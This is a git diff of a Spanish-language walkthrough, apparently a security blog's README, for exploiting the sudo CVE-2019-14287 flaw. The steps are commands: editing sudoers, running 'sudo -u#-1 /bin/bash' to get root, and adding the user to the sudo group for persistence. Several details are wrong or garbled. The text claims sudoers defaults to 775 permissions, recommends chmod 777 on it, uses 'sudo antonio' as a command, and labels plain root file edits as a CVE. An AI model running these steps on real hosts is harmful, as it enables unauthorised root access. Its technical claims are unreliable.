@@ -1,41 +1,8 @@
-# sudo
+#0.- Por defecto /etc/sudoers tiene permisos chmod 775. 
 
-# CVE-2017-XXXX hackingyseguridad
+Intentamos para editar sin problemas el fichero sudoers $chmod 777 /etc/sudoers  y volvemos a restablecer después los privilegios chmod 755 /etc/sudoers
 
-#1.- Para editar el fichero sudoers sin problemas 
-
-$chmod 777 /etc/sudoers    
-
-#2.- Añadidmos en la linea sudo de /etc/group al usuario antonio
-
-sudo vim /etc/group
-
-sudo:x : 27:antonio
-
-forzamos la escritura en group al salir con :wq!
-
-#3.- Restablecemos los privilegios del fichero sudoers con 
-
-$chmod 755 /etc/sudoers
-
-#4.- Explotamos 
-
-$sudo antonio
-
-$sudo su
-
-#whoami
-
-#5.- ya somos root!
-
-
-# CVE-2019-14287 VULNERABILIDAD SUDO VERSIONES < 1.8.28 
-
-#0.- Comprovamos la version de sudo instalada con: 
-
-$sudo -V
-
-#1.- Editamos el fichero /etc/sudoers con: 
+#1.- Editamos el fichero /etc/sudoers con 
 
 $sudo visudo 
 
@@ -45,11 +12,9 @@ $sudo visudo
 
 root ALL=(ALL:ALL) ALL
 
-%admin ALL=(ALL) ALL
-
 antonio ALL=(ALL) /usr/bin/id
 
-#3.- Ejecutamos: 
+#4.- Ejecutamos: 
 
 $su antonio
 
@@ -59,18 +24,40 @@ $sudo whoani
 
 $sudo -u antonio id
 
-#4.- Volvemos a editar el fichero /etc/sudoers con: 
+#5.- Volvemos a editar el fichero /etc/sudoers con $sudo visudo
 
-$sudo visudo
-
-#5.- Modificamos la linea
+#6.- Modificamos la línea
 
 antonio ALL=(ALL, !root) ALL
 
-#6.- Explotamos la vulnerabilidad con sudo -u#-1
+#7.- Explotamos la vulnerabilidad con sudo -u#-1
+
+$chmod 755 /etc/sudoers
 
 $sudo -u#-1 /bin/bash
 
 #whoami
 
-#7.- ya somos root!
+root
+
+#8.- ya somos root!
+
+exit
+
+#9.- Otro si: añadimos en la línea sudo de /etc/group a antonio y nos hacernos persistentes en la maquina:
+
+sudo vim /etc/group
+
+sudo : x:27:antonio
+
+forzamos la escritura en group al salir con :wq!
+
+$sudo antonio
+
+$sudo su
+
+#10.- ya somos del grupo sudo y podemos elevar a root!
+
+Editamos y eliminamos de sudoers la linea
+antonio ALL=(ALL, !root) ALL
+
